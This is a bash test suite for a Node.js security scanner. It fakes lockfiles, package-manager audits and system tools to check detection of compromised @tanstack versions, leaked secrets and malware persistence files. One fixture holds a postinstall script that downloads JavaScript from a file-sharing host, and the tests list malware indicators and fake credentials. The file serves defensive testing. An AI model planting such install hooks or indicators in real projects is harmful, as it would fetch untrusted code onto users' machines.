#!/usr/bin/env bash
#
# Tests for node-security-check.sh.
#
# Needs bash, git, node and the usual Unix tools. No network: fake package
# managers and fake system tools (ps, ss, ufw, docker, curl...) stand in for
# the real ones, and fake projects are built in a temporary folder.
#
# Usage:
#   bash tests/run-tests.sh                 # from the repo root
#   bash tests/run-tests.sh path/to/script  # test another copy
#   VERBOSE=1 bash tests/run-tests.sh       # show the output of failing tests
#   RUN_NETWORK_TESTS=1 bash tests/run-tests.sh
#       also runs the real npm, pnpm, yarn and bun audits (those that are
#       installed) against a project with known-vulnerable packages
#
set -uo pipefail

HERE="$(cd "$(dirname "$0")" && pwd)"
SCRIPT="${1:-$HERE/../node-security-check.sh}"
[[ -f "$SCRIPT" ]] || { echo "can't find $SCRIPT" >&2; exit 1; }
SCRIPT="$(cd "$(dirname "$SCRIPT")" && pwd)/$(basename "$SCRIPT")"
for need in git node; do
  command -v "$need" >/dev/null 2>&1 || { echo "these tests need $need" >&2; exit 1; }
done

REAL_PATH="$PATH"
T="$(mktemp -d)"
trap 'rm -rf "$T"' EXIT
cd "$T" || exit 1
mkdir -p bin/base tmp out home-clean

# The tests run with a PATH that holds only these real tools, plus fakes.
for tool in bash sh env awk sed grep cut tr head tail sort wc cat ls find mktemp rm mv date uname id basename dirname git node tee chmod mkdir touch cp ps timeout xargs readlink; do
  p=""
  for d in /usr/bin /bin /usr/local/bin; do [[ -z "$p" && -x "$d/$tool" ]] && p="$d/$tool"; done
  [[ -z "$p" ]] && p="$(command -v "$tool" 2>/dev/null)"
  [[ "$p" == /* ]] && ln -s "$p" "bin/base/$tool"
done

# ------------------------------------------------------------- helpers ----
# fake SCENARIO TOOL 'shell lines': a fake command at bin/SCENARIO/TOOL
fake() { mkdir -p "bin/$1"; printf '#!/bin/sh\n%s\n' "$3" > "bin/$1/$2"; chmod +x "bin/$1/$2"; }
# fakeout SCENARIO TOOL EXIT-CODE 'output': a fake command that prints fixed output
fakeout() {
  mkdir -p "bin/$1"; printf '%s\n' "$4" > "out/$1.$2"
  printf '#!/bin/sh\ncat "%s"\nexit %s\n' "$T/out/$1.$2" "$3" > "bin/$1/$2"; chmod +x "bin/$1/$2"
}
# fakeid SCENARIO UID: a fake "id" (the script asks for the user ID and the user name)
REAL_USER="$(id -un)"
fakeid() { mkdir -p "bin/$1"; printf '#!/bin/sh\ncase "$1" in -un) echo "%s" ;; *) echo %s ;; esac\n' "$REAL_USER" "$2" > "bin/$1/id"; chmod +x "bin/$1/id"; }

# A fake curl. Answers come from the folder named in $CURL_FIX; with nothing
# there, every page is "404 Not Found" and OSV says nothing is malicious.
cat > bin/fakecurl <<'FAKECURL'
#!/bin/bash
hdr=""; body=""; url=""; tls=0; w=0; data=""; origin=0; method="GET"
while [ $# -gt 0 ]; do
  case "$1" in
    -D) hdr="$2"; shift 2 ;;
    -o) body="$2"; shift 2 ;;
    -w) w=1; shift 2 ;;
    -X) method="$2"; shift 2 ;;
    -H) case "$2" in Origin:*) origin=1 ;; esac; shift 2 ;;
    --data-binary) data="$2"; shift 2 ;;
    --max-time|--max-filesize) shift 2 ;;
    --tls-max) tls=1; shift 2 ;;
    -*) shift ;;
    *) url="$1"; shift ;;
  esac
done
F="${CURL_FIX:-/nonexistent}"
if [ "$tls" = 1 ]; then [ -f "$F/oldtls" ] && exit 0; exit 35; fi
[ -f "$F/exit" ] && exit "$(cat "$F/exit")"
case "$url" in
  *querybatch*)
    [ -f "$F/osv-fail" ] && exit 7
    mal=""; [ -f "$F/osv-mal" ] && mal="$(cat "$F/osv-mal")"
    { printf '{"results":['
      grep -o '"name":"[^"]*"' "${data#@}" | { sep=""; while IFS= read -r line; do
        n="${line#\"name\":\"}"; n="${n%\"}"
        if [ -n "$mal" ] && [ "$n" = "$mal" ]; then printf '%s{"vulns":[{"id":"MAL-2026-4242","modified":"2026-01-01T00:00:00Z"}]}' "$sep"
        elif [ -f "$F/osv-vuln" ]; then printf '%s{"vulns":[{"id":"GHSA-aaaa-bbbb-cccc","modified":"x"}]}' "$sep"
        else printf '%s{}' "$sep"; fi
        sep=","
      done; }
      printf ']}'; } > "$body"
    exit 0 ;;
  *dist/index.json*) [ -f "$F/nodedist.body" ] || exit 6; cat "$F/nodedist.body" > "$body"; exit 0 ;;
esac
path="${url#*://}"; case "$path" in */*) path="/${path#*/}" ;; *) path="/" ;; esac
key=""
case "$url" in http://*) key="http" ;; esac
if [ -z "$key" ]; then
  if [ "$method" = "TRACE" ]; then key="trace"
  elif [ "$method" = "POST" ]; then key="post$(printf '%s' "$path" | tr '/.' '__')"
  elif [ "$origin" = 1 ] && [ -f "$F/cors.hdr" ]; then key="cors"
  else
    case "$path" in
      /) key="root" ;;
      /nsc-check-missing-page-*) key="missing" ;;
      *) key="$(printf '%s' "${path#/}" | tr '/.%' '___')" ;;
    esac
  fi
fi
if [ -f "$F/$key.hdr" ]; then cat "$F/$key.hdr" > "$hdr"; else printf 'HTTP/1.1 404 Not Found\r\n\r\n' > "$hdr"; fi
if [ -n "$body" ] && [ "$body" != /dev/null ]; then
  if [ -f "$F/$key.body" ]; then cat "$F/$key.body" > "$body"; else : > "$body"; fi
fi
[ "$w" = 1 ] && printf '%s' "$(head -n 1 "$hdr" | awk '{ print $2 }')"
exit 0
FAKECURL
chmod +x bin/fakecurl

# proj NAME: a minimal project at p/NAME
proj() { mkdir -p "p/$1"; printf '{ "name": "%s", "version": "1.0.0", "private": true }\n' "$1" > "p/$1/package.json"; }
# put PATH 'content'
put() { mkdir -p "$(dirname "$1")"; printf '%s\n' "$2" > "$1"; }
# gitify NAME: commit everything in p/NAME
gitify() {
  ( cd "p/$1" && git init -q . && git add -A && git -c user.name=test -c user.email=test@example.invalid commit -q -m init ) >/dev/null 2>&1 \
    || { echo "git setup failed for $1" >&2; exit 1; }
}

PASS=0; FAIL=0
BINS=""             # fake-tool scenarios to put on the PATH, first wins
HOME_DIR="home-clean"
SYSROOT=""          # fake /etc and /var
INPUT=""            # typed answers for the setup questions
ENVS=""             # extra VAR=value settings

# t "name" EXIT-CODE "text that must appear" "text that must NOT appear" args...
t() {
  local name="$1" want_rc="$2" want="$3" unwanted="$4"; shift 4
  local path="" b out rc why=""
  for b in $BINS; do path="${path}$T/bin/$b:"; done
  path="${path}$T/bin/base"
  # shellcheck disable=SC2086  # ENVS is a deliberate word list
  out="$(printf '%s' "$INPUT" | env -i HOME="$T/$HOME_DIR" PATH="$path" TMPDIR="$T/tmp" NSC_SYSROOT="$SYSROOT" $ENVS bash "$SCRIPT" "$@" 2>&1)"
  rc=$?
  [[ "$rc" == "$want_rc" ]] || why="exit $rc, wanted $want_rc"
  if [[ -n "$want" ]] && ! grep -qF -- "$want" <<< "$out"; then why="${why:+$why; }missing text: $want"; fi
  if [[ -n "$unwanted" ]] && grep -qF -- "$unwanted" <<< "$out"; then why="${why:+$why; }unwanted text: $unwanted"; fi
  if [[ "${SHOW:-}" == "$name" ]]; then printf '%s\n' "$out" | sed 's/^/      | /'; fi
  if [[ -z "$why" ]]; then
    PASS=$((PASS + 1)); printf 'ok    %s\n' "$name"
  else
    FAIL=$((FAIL + 1)); printf 'FAIL  %s (%s)\n' "$name" "$why"
    [[ "${VERBOSE:-0}" == "1" ]] && printf '%s\n' "$out" | sed 's/^/      | /'
  fi
}
group() { printf '\n# %s\n' "$1"; }

# ------------------------------------------- fake package manager audits ---
NPM_CLEAN='{"auditReportVersion":2,"vulnerabilities":{},"metadata":{"vulnerabilities":{"info":0,"low":0,"moderate":0,"high":0,"critical":0,"total":0}}}'
PNPM_CLEAN='{"actions":[],"advisories":{},"muted":[],"metadata":{"vulnerabilities":{"info":0,"low":0,"moderate":0,"high":0,"critical":0},"dependencies":3}}'
YARN_CLEAN='{"type":"auditSummary","data":{"vulnerabilities":{"info":0,"low":0,"moderate":0,"high":0,"critical":0},"dependencies":2}}'
fakeout ok npm  0 "$NPM_CLEAN"
fakeout ok pnpm 0 "$PNPM_CLEAN"
fakeout ok yarn 0 "$YARN_CLEAN"
fakeout ok bun  0 '{}'

fakeout crit npm 1 '{"auditReportVersion":2,"vulnerabilities":{"minimist":{"name":"minimist","severity":"critical","via":[{"title":"Prototype Pollution in minimist"}]},"lodash":{"name":"lodash","severity":"high","via":["other"]}},"metadata":{"vulnerabilities":{"info":0,"low":0,"moderate":0,"high":1,"critical":1,"total":2}}}'
fakeout crit pnpm 1 '{"advisories":{"1":{"module_name":"minimist","severity":"critical","title":"Prototype Pollution in minimist"},"2":{"module_name":"lodash","severity":"high","title":"Command Injection in lodash"}},"metadata":{"vulnerabilities":{"info":0,"low":0,"moderate":0,"high":1,"critical":1}}}'
fakeout crit yarn 12 '{"type":"auditAdvisory","data":{"advisory":{"module_name":"minimist","severity":"critical","title":"Prototype Pollution in minimist"}}}
{"type":"auditAdvisory","data":{"advisory":{"module_name":"lodash","severity":"high","title":"Command Injection in lodash"}}}
{"type":"auditSummary","data":{"vulnerabilities":{"info":0,"low":0,"moderate":0,"high":1,"critical":1},"dependencies":2}}'
# The title holds a terminal escape sequence, which must not reach the screen.
fakeout crit bun 1 '{"minimist":[{"severity":"critical","title":"Prototype Pollution in minimist \u001b[31mRED"}],"lodash":[{"severity":"high","title":"Command Injection in lodash"}]}'

fakeout high npm 1 '{"auditReportVersion":2,"vulnerabilities":{"lodash":{"name":"lodash","severity":"high","via":[{"title":"Command Injection in lodash"}]}},"metadata":{"vulnerabilities":{"info":0,"low":0,"moderate":0,"high":1,"critical":0,"total":1}}}'
fakeout high bun 1 '{"lodash":[{"severity":"high","title":"Command Injection in lodash"}]}'

fakeout garbage npm 1 '{"error":{"code":"ENOTFOUND","summary":"request to https://registry.npmjs.org failed"}}'
fakeout garbage bun 1 'error: network unreachable'

# Yarn 2+ prints one line per advisory, and nothing at all when clean.
fakeout berry yarn 1 '{"value":"minimist","children":{"ID":1097677,"Issue":"Prototype Pollution in minimist","Severity":"critical","Vulnerable Versions":"<0.2.4"}}
{"value":"lodash","children":{"ID":1106913,"Issue":"Command Injection in lodash","Severity":"high","Vulnerable Versions":"<4.17.21"}}'
fake berry-clean yarn 'exit 0'
for s in ok crit high berry berry-clean; do cp bin/fakecurl "bin/$s/curl"; done
fake garbage curl 'exit 6'

# ============================================================ PACKAGES ====
group "Packages: known-compromised versions in each lockfile format"

bunlock() { proj "$1"; put "p/$1/bun.lock" "$2"; }
bunlock clean    '"@tanstack/react-router": ["@tanstack/react-router@1.170.45", "", {}, "sha512-x"],'
bunlock top      '"@tanstack/react-router": ["@tanstack/react-router@1.169.5", "", {}, "sha512-x"],'
# The safe copy sorts first, so a check that only reads the first copy would miss the bad one.
bunlock nested   '"@tanstack/router-core": ["@tanstack/router-core@1.169.4", "", {}, "sha512-x"],
"@tanstack/react-start/@tanstack/router-core": ["@tanstack/router-core@1.169.8", "", {}, "sha512-y"],'
bunlock prefix   '"@tanstack/react-start-client": ["@tanstack/react-start-client@1.166.51", "", {}, "sha512-x"],
"@tanstack/react-start": ["@tanstack/react-start@1.169.3", "", {}, "sha512-y"],'
bunlock nearmiss '"@tanstack/react-router": ["@tanstack/react-router@1.169.50", "", {}, "sha512-x"],
"@tanstack/history": ["@tanstack/history@1.161.90", "", {}, "sha512-y"],'
bunlock vue      '"@tanstack/vue-router": ["@tanstack/vue-router@1.169.8", "", {}, "sha512-x"],'
bunlock zod      '"@tanstack/zod-adapter": ["@tanstack/zod-adapter@1.166.12", "", {}, "sha512-x"],'

BINS="ok"
t "clean lockfile passes"                    0 "RESULT: PASS" "[ALERT]"                                             --only packages --pm bun p/clean
t "malicious top-level copy"                 1 "Known-malicious version in the lockfile: @tanstack/react-router@1.169.5" "" --only packages --pm bun p/top
t "malicious nested copy"                    1 "Known-malicious version in the lockfile: @tanstack/router-core@1.169.8" "" --only packages --pm bun p/nested
t "similar package names kept apart"         1 "@tanstack/react-start-client@1.166.51" "@tanstack/react-start@"     --only packages --pm bun p/prefix
t "near-miss versions not flagged"           0 "RESULT: PASS" "[ALERT]"                                             --only packages --pm bun p/nearmiss
t "newly added package (vue-router)"         1 "@tanstack/vue-router@1.169.8" ""                                    --only packages --pm bun p/vue
t "newly added package (zod-adapter)"        1 "@tanstack/zod-adapter@1.166.12" ""                                  --only packages --pm bun p/zod

proj npm3; put p/npm3/package-lock.json '{
  "name": "npm3",
  "version": "1.0.0",
  "lockfileVersion": 3,
  "packages": {
    "": {
      "name": "npm3",
      "version": "1.0.0",
      "dependencies": {
        "@tanstack/history": "^1.161.0"
      }
    },
    "node_modules/@tanstack/history": {
      "version": "1.161.8",
      "resolved": "https://registry.npmjs.org/@tanstack/history/-/history-1.161.8.tgz"
    },
    "node_modules/some-parent/node_modules/@tanstack/history": {
      "version": "1.161.12",
      "resolved": "https://registry.npmjs.org/@tanstack/history/-/history-1.161.12.tgz",
      "engines": {
        "node": ">=12"
      }
    }
  }
}'
proj npm3ok; sed 's/1\.161\.12/1.161.13/g' p/npm3/package-lock.json > p/npm3ok/package-lock.json
proj npm1; put p/npm1/package-lock.json '{
  "name": "npm1",
  "version": "1.0.0",
  "lockfileVersion": 1,
  "requires": true,
  "dependencies": {
    "some-parent": {
      "version": "2.0.0",
      "requires": {
        "@tanstack/router-utils": "^1.161.0"
      },
      "dependencies": {
        "@tanstack/router-utils": {
          "version": "1.161.14",
          "resolved": "https://registry.npmjs.org/@tanstack/router-utils/-/router-utils-1.161.14.tgz"
        }
      }
    }
  }
}'
proj npmalias; put p/npmalias/package-lock.json '{
  "name": "npmalias",
  "lockfileVersion": 3,
  "packages": {
    "node_modules/my-router": {
      "name": "@tanstack/react-router",
      "version": "1.169.8"
    }
  }
}'
t "package-lock.json v3, nested copy"        1 "@tanstack/history@1.161.12" "@tanstack/history@1.161.8"             --only packages --pm npm p/npm3
t "package-lock.json v3, fixed version"      0 "RESULT: PASS" "[ALERT]"                                             --only packages --pm npm p/npm3ok
t "package-lock.json v1, nested copy"        1 "@tanstack/router-utils@1.161.14" ""                                 --only packages --pm npm p/npm1
t "package-lock.json, aliased package"       1 "@tanstack/react-router@1.169.8" ""                                  --only packages --pm npm p/npmalias

proj pnpm9; put p/pnpm9/pnpm-lock.yaml "lockfileVersion: '9.0'

importers:

  .:
    dependencies:
      '@tanstack/react-router':
        specifier: ^1.169.0
        version: 1.169.5(react@18.3.1)

packages:

  '@tanstack/react-router@1.169.5':
    resolution: {integrity: sha512-x}

  react@18.3.1:
    resolution: {integrity: sha512-y}

snapshots:

  '@tanstack/react-router@1.169.5(react@18.3.1)':
    dependencies:
      react: 18.3.1

  react@18.3.1: {}"
proj pnpm9ok; sed 's/1\.169\.5/1.169.9/g' p/pnpm9/pnpm-lock.yaml > p/pnpm9ok/pnpm-lock.yaml
proj pnpm6; put p/pnpm6/pnpm-lock.yaml "lockfileVersion: '6.0'

packages:

  /@tanstack/start-fn-stubs@1.161.12(react@18.2.0):
    resolution: {integrity: sha512-x}
    dev: false

  /react@18.2.0:
    resolution: {integrity: sha512-y}"
proj pnpm5; put p/pnpm5/pnpm-lock.yaml "lockfileVersion: 5.4

packages:

  /@tanstack/history/1.161.9:
    resolution: {integrity: sha512-x}
    dev: false

  /react-dom/18.2.0_react@18.2.0:
    resolution: {integrity: sha512-y}"
t "pnpm-lock.yaml v9"                        1 "@tanstack/react-router@1.169.5" ""                                  --only packages --pm pnpm p/pnpm9
t "pnpm-lock.yaml v9, fixed version"         0 "RESULT: PASS" "[ALERT]"                                             --only packages --pm pnpm p/pnpm9ok
t "pnpm-lock.yaml v6"                        1 "@tanstack/start-fn-stubs@1.161.12" ""                               --only packages --pm pnpm p/pnpm6
t "pnpm-lock.yaml v5"                        1 "@tanstack/history@1.161.9" ""                                       --only packages --pm pnpm p/pnpm5

proj yarn1; put p/yarn1/yarn.lock '# yarn lockfile v1


"@tanstack/router-core@^1.160.0", "@tanstack/router-core@^1.169.0":
  version "1.169.8"
  resolved "https://registry.yarnpkg.com/@tanstack/router-core/-/router-core-1.169.8.tgz#abc"
  integrity sha512-x

react@^18.0.0:
  version "18.3.1"
  resolved "https://registry.yarnpkg.com/react/-/react-18.3.1.tgz#def"'
proj yarn1ok; sed 's/1\.169\.8/1.169.9/g' p/yarn1/yarn.lock > p/yarn1ok/yarn.lock
proj yarn4; put p/yarn4/yarn.lock '__metadata:
  version: 8
  cacheKey: 10c0

"@tanstack/virtual-file-routes@npm:^1.161.0":
  version: 1.161.13
  resolution: "@tanstack/virtual-file-routes@npm:1.161.13"
  checksum: 10c0/abc
  languageName: node
  linkType: hard'
proj yarn4alias; put p/yarn4alias/yarn.lock '__metadata:
  version: 8

"my-history@npm:@tanstack/history@^1.161.0":
  version: 1.161.9
  resolution: "@tanstack/history@npm:1.161.9"
  languageName: node
  linkType: hard'
t "yarn.lock v1 (classic)"                   1 "@tanstack/router-core@1.169.8" ""                                   --only packages --pm yarn p/yarn1
t "yarn.lock v1, fixed version"              0 "RESULT: PASS" "[ALERT]"                                             --only packages --pm yarn p/yarn1ok
BINS="berry-clean"
t "yarn.lock v2+ (berry)"                    1 "@tanstack/virtual-file-routes@1.161.13" ""                          --only packages --pm yarn p/yarn4
t "yarn.lock v2+, aliased package"           1 "@tanstack/history@1.161.9" ""                                       --only packages --pm yarn p/yarn4alias
BINS="ok"

proj twolocks; cp p/clean/bun.lock p/twolocks/bun.lock; cp p/npm3/package-lock.json p/twolocks/package-lock.json
t "every lockfile is read, not just one"     1 "@tanstack/history@1.161.12" ""                                      --only packages --pm bun p/twolocks
t "two lockfiles give a warning"             1 "More than one lockfile" ""                                          --only packages --pm bun p/twolocks

put iocs.txt '# my own list
left-pad 1.3.0 1.2.0   # two bad versions
some-other-package 9.9.9'
bunlock custom '"left-pad": ["left-pad@1.3.0", "", {}, "sha512-x"],'
t "--ioc-file entry is caught"               1 "left-pad@1.3.0  (source: your list)" ""                             --only packages --pm bun --ioc-file iocs.txt p/custom
t "without --ioc-file it passes"             0 "RESULT: PASS" ""                                                    --only packages --pm bun p/custom
t "--ioc-file that doesn't exist"            3 "not found" ""                                                       --only packages --ioc-file nope.txt p/custom

group "Packages: malware markers and leftover files"
bunlock marker   '"x": ["x@1.0.0", "", {"bin": "router_init.js"}, "sha512-x"],'
bunlock marker2  '"@tanstack/setup": ["@tanstack/setup@github:tanstack/router#79ac49eedf774dd4b0cfa308722bc463cfe5885c", {}, "x"],'
bunlock marker3  '"x": ["x@1.0.0", "", {"scripts": {"postinstall": "curl https://litter.catbox.moe/h8nc9u.js"}}, "sha512-x"],'
t "marker in lockfile (router_init.js)"      1 "Malware marker 'router_init.js' found in bun.lock" ""               --only packages --pm bun p/marker
t "marker in lockfile (commit hash)"         1 "79ac49eedf774dd4b0cfa308722bc463cfe5885c" ""                        --only packages --pm bun p/marker2
t "marker in lockfile (download host)"       1 "litter.catbox.moe" ""                                               --only packages --pm bun p/marker3

mkdir -p home-systemd/.config/systemd/user home-mac/Library/LaunchAgents home-localbin/.local/bin
touch home-systemd/.config/systemd/user/gh-token-monitor.service
touch home-mac/Library/LaunchAgents/com.user.gh-token-monitor.plist
touch home-localbin/.local/bin/gh-token-monitor.sh
HOME_DIR="home-systemd";  t "persistence file: Linux systemd"   1 "gh-token-monitor.service" ""        --only packages --pm bun p/clean
HOME_DIR="home-mac";      t "persistence file: macOS LaunchAgent" 1 "com.user.gh-token-monitor.plist" "" --only packages --pm bun p/clean
HOME_DIR="home-localbin"; t "persistence file: ~/.local/bin"    1 "gh-token-monitor.sh" ""             --only packages --pm bun p/clean
HOME_DIR="home-clean"
t "compromise message: persistence first"    1 "Remove the persistence FIRST" ""                                    --only packages --pm bun p/top

bunlock inproj1 '"left-pad": ["left-pad@1.3.0", "", {}, "sha512-x"],'; put p/inproj1/.claude/setup.mjs '// x'
bunlock inproj2 '"left-pad": ["left-pad@1.3.0", "", {}, "sha512-x"],'; put p/inproj2/.vscode/tasks.json '{ "tasks": [ { "command": "node .vscode/setup.mjs" } ] }'
bunlock inproj3 '"left-pad": ["left-pad@1.3.0", "", {}, "sha512-x"],'; put p/inproj3/.vscode/tasks.json '{ "tasks": [ { "command": "npm test" } ] }'
put p/inproj3/.claude/settings.json '{ "permissions": {} }'
bunlock inproj4 '"left-pad": ["left-pad@1.3.0", "", {}, "sha512-x"],'; put p/inproj4/node_modules/@tanstack/react-router/router_init.js '// x'
bunlock codeql1 '"left-pad": ["left-pad@1.3.0", "", {}, "sha512-x"],'; put p/codeql1/.github/workflows/codeql_analysis.yml 'name: x'
bunlock codeql2 '"left-pad": ["left-pad@1.3.0", "", {}, "sha512-x"],'; put p/codeql2/.github/workflows/codeql-analysis.yml 'name: x'
t "project file: .claude/setup.mjs"          1 ".claude/setup.mjs" ""                                               --only packages --pm bun p/inproj1
t "project file: tasks.json runs setup.mjs"  1 "tasks.json runs setup.mjs" ""                                       --only packages --pm bun p/inproj2
t "normal tasks.json and settings.json"      0 "RESULT: PASS" "[ALERT]"                                             --only packages --pm bun p/inproj3
t "payload file inside node_modules"         1 "Malware payload file(s) inside node_modules" ""                   --only packages --pm bun p/inproj4
t "codeql_analysis.yml (underscore) warns"   0 "codeql_analysis.yml exists" ""                                      --only packages --pm bun p/codeql1
t "codeql-analysis.yml (hyphen) is fine"     0 "" "codeql_analysis"                                                   --only packages --pm bun p/codeql2

group "Packages: audit result from each package manager"
proj a-npm;  cp p/npm3ok/package-lock.json p/a-npm/
proj a-pnpm; cp p/pnpm9ok/pnpm-lock.yaml p/a-pnpm/
proj a-yarn; cp p/yarn1ok/yarn.lock p/a-yarn/
proj a-berry; put p/a-berry/yarn.lock '__metadata:
  version: 8

"left-pad@npm:^1.3.0":
  version: 1.3.0
  resolution: "left-pad@npm:1.3.0"'
BINS="ok"
t "npm: clean audit"                         0 "npm audit: no known vulnerabilities" ""                             --only packages --pm npm p/a-npm
t "pnpm: clean audit"                        0 "pnpm audit: no known vulnerabilities" ""                            --only packages --pm pnpm p/a-pnpm
t "yarn classic: clean audit"                0 "yarn audit: no known vulnerabilities" ""                            --only packages --pm yarn p/a-yarn
t "bun: clean audit"                         0 "bun audit: no known vulnerabilities" ""                             --only packages --pm bun p/clean
BINS="berry-clean"
t "yarn 2+: clean audit (no output)"         0 "yarn audit: no known vulnerabilities" ""                            --only packages --pm yarn p/a-berry
BINS="crit"
t "npm: critical fails by default"           2 "at or above 'critical' (critical=1 high=1" ""                       --only packages --pm npm p/a-npm
t "pnpm: critical fails by default"          2 "at or above 'critical' (critical=1 high=1" ""                       --only packages --pm pnpm p/a-pnpm
t "yarn classic: critical fails by default"  2 "at or above 'critical' (critical=1 high=1" ""                       --only packages --pm yarn p/a-yarn
t "bun: critical fails by default"           2 "at or above 'critical' (critical=1 high=1" ""                       --only packages --pm bun p/clean
t "findings are listed by name"              2 "minimist: Prototype Pollution in minimist" ""                       --only packages --pm pnpm p/a-pnpm
t "escape sequences in titles are removed"   2 "minimist [31mRED" "$(printf '\033')"                                --only packages --pm bun p/clean
BINS="berry"
t "yarn 2+: critical fails by default"       2 "at or above 'critical' (critical=1 high=1" ""                       --only packages --pm yarn p/a-berry
BINS="high"
t "high finding passes by default (warning)" 0 "below the 'critical' level" ""                                      --only packages --pm bun p/clean
t "high finding fails with --fail-on high"   2 "at or above 'high'" ""                                              --only packages --pm bun --fail-on high p/clean
ENVS="FAIL_ON=high"
t "high finding fails with FAIL_ON=high"     2 "at or above 'high'" ""                                              --only packages --pm npm p/a-npm
ENVS=""
t "--fail-on-warn turns warnings into fail"  2 "--fail-on-warn is set" ""                                           --only packages --pm bun --fail-on-warn p/clean
BINS="garbage"
t "unreadable audit: reported, still passes" 0 "so the audit did not complete" ""                                   --only packages --pm bun p/clean
t "npm error object counts as unreadable"    0 "so the audit did not complete" ""                                   --only packages --pm npm p/a-npm
t "unreadable audit with --strict"           3 "RESULT: NOT COMPLETE" ""                                            --only packages --pm bun --strict p/clean
ENVS="STRICT=1"
t "unreadable audit with STRICT=1"           3 "RESULT: NOT COMPLETE" ""                                            --only packages --pm bun p/clean
ENVS=""
BINS=""
t "package manager not installed"            0 "bun is not installed here" ""                                       --only packages --pm bun p/clean
t "package manager not installed, --strict"  3 "RESULT: NOT COMPLETE" ""                                            --only packages --pm bun --strict p/clean
t "--no-network skips the audit"             0 "Skipped (--no-network)" "not installed"                             --only packages --pm bun --no-network --strict p/clean
BINS="crit"
t "compromise outranks audit failure"        1 "possible supply-chain COMPROMISE" ""                                --only packages --pm bun p/top
BINS="ok"

group "Packages: lockfile and install settings"
proj nolock
proj lockb; touch p/lockb/bun.lockb
t "no lockfile warns"                        0 "No lockfile found" ""                                               --only packages --pm npm p/nolock
t "binary bun.lockb can't be read"           0 "bun.lockb is Bun's old binary lockfile" ""                          --only packages --pm bun p/lockb
t "binary bun.lockb with --strict"           3 "RESULT: NOT COMPLETE" ""                                            --only packages --pm bun --strict p/lockb
t "lockfile from another package manager"    0 "None of them belongs to pnpm" ""                                    --only packages --pm pnpm p/clean
t "package manager detected from lockfile"   0 "Package manager  : pnpm" ""                                         --only packages p/a-pnpm

TOK="_authToken="; TOK="${TOK}abcdefabcdefabcdefabcdefabcdefabcdef"
bunlock npmrc-bad '"left-pad": ["left-pad@1.3.0", "", {}, "sha512-x"],'; put p/npmrc-bad/.npmrc "//registry.npmjs.org/:${TOK}"; gitify npmrc-bad
bunlock npmrc-ok  '"left-pad": ["left-pad@1.3.0", "", {}, "sha512-x"],'; put p/npmrc-ok/.npmrc '//registry.npmjs.org/:_authToken=${NPM_TOKEN}
min-release-age=3'; gitify npmrc-ok
t "committed .npmrc token is a problem"      2 ".npmrc holds a registry token or password and is committed" "abcdefabcdef" --only packages --pm npm p/npmrc-bad
t ".npmrc using \${NPM_TOKEN} is fine"       0 "" "registry token"                                                  --only packages --pm bun p/npmrc-ok
t "minimum release age is recognised (npm)"  0 "A minimum release age is set" ""                                    --only packages --pm npm p/npmrc-ok
t "lockfile committed to git"                0 "bun.lock is committed to git" ""                                    --only packages --pm bun p/npmrc-ok
bunlock unlocked '"left-pad": ["left-pad@1.3.0", "", {}, "sha512-x"],'; put p/unlocked/.gitignore 'bun.lock'; gitify unlocked
t "lockfile not committed warns"             0 "bun.lock is not committed to git" ""                                --only packages --pm bun p/unlocked

mkdir -p p/latest; put p/latest/package.json '{ "name": "latest", "dependencies": { "express": "latest", "left-pad": "^1.3.0" } }'
t "dependency set to \"latest\" warns"       0 'set to "*" or "latest"' ""                                          --only packages --pm npm p/latest
mkdir -p p/gitdep; put p/gitdep/package.json '{
  "name": "gitdep",
  "homepage": "https://example.com",
  "repository": "someone/gitdep",
  "dependencies": {
    "left-pad": "^1.3.0",
    "my-fork": "github:someone/my-fork#main"
  }
}'
mkdir -p p/urls; put p/urls/package.json '{
  "name": "urls",
  "homepage": "https://example.com",
  "repository": "someone/urls",
  "bugs": { "url": "https://github.com/someone/urls/issues" },
  "dependencies": {
    "left-pad": "^1.3.0"
  }
}'
t "dependency loaded from git gets a note"   0 "dependency loaded from git or a URL" ""                             --only packages --pm npm p/gitdep
t "homepage/repository are not dependencies" 0 "" "loaded from git"                                                 --only packages --pm npm p/urls
proj oldnode; put p/oldnode/.nvmrc 'v18.20.4'
proj newnode; put p/newnode/.nvmrc '24'
t "end-of-life Node in .nvmrc warns"         0 "Node.js 18 (set in .nvmrc) reached end of life on 2025-04-30" ""    --only packages --pm npm p/oldnode
t "supported Node in .nvmrc is fine"         0 "" "reached end of life"                                             --only packages --pm npm p/newnode

# ================================================================ CODE ====
group "Code: secrets"
AK="AKIA"; AK="${AK}IOSFODNN7EXAMPLE"
GH="ghp_"; GH="${GH}aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
PK="-----BEGIN RSA"; PK="${PK} PRIVATE KEY-----"
DBURL="postgres://app:"; DBURL="${DBURL}hunter2hunter2@db.example.com/app"

proj c-clean; put p/c-clean/src/index.js 'const x = process.env.API_KEY;
const re = /a/; re.exec(input + other);
console.log("hello");'; put p/c-clean/.env 'API_KEY=abc'; put p/c-clean/.gitignore '.env
node_modules'; put p/c-clean/.env.example 'API_KEY='; gitify c-clean
t "clean project passes"                     0 "RESULT: PASS." "[WARN]"                                             --only code p/c-clean
t "ignored .env is not reported"             0 "No .env file is committed to git" ""                                --only code p/c-clean

proj c-env; put p/c-env/.env 'API_KEY=abc'; put p/c-env/config/.env.production 'X=1'; gitify c-env
t "committed .env is a problem"              2 ".env file(s) committed to git" ""                                   --only code p/c-env
t "committed .env.production is listed"      2 "config/.env.production" ""                                          --only code p/c-env

proj c-noignore; put p/c-noignore/src/a.js 'x'; gitify c-noignore; put p/c-noignore/.env 'A=1'
t ".env not covered by .gitignore warns"     0 ".gitignore doesn't cover it" ""                                     --only code p/c-noignore

proj c-aws; put p/c-aws/src/config.js "const key = '${AK}';"; gitify c-aws
t "AWS key in a committed file"              2 "AWS access key ID: 1 line" ""                                       --only code p/c-aws
t "the key itself is never printed"          2 "src/config.js:1" "${AK}"                                            --only code p/c-aws
proj c-gh; put p/c-gh/deploy.sh "export GH=${GH}"; gitify c-gh
t "GitHub token in a committed file"         2 "GitHub token: 1 line" "${GH}"                                       --only code p/c-gh
proj c-pk; put p/c-pk/certs/server.txt "${PK}
MIIabc"; gitify c-pk
t "private key in a committed file"          2 "Private key: 1 line" ""                                             --only code p/c-pk
proj c-db; put p/c-db/src/db.js "const url = \"${DBURL}\";"; gitify c-db
t "database address with password warns"     0 "address with a password in it" "hunter2"                            --only code p/c-db
proj c-generic; put p/c-generic/src/a.js 'const password = "correct-horse-battery";
const apiKey = process.env.KEY;
const secret = "${FROM_ENV}";'; gitify c-generic
t "hard-coded password warns (1 line only)"  0 "Possible hard-coded password, secret or key: 1 line" "correct-horse" --only code p/c-generic

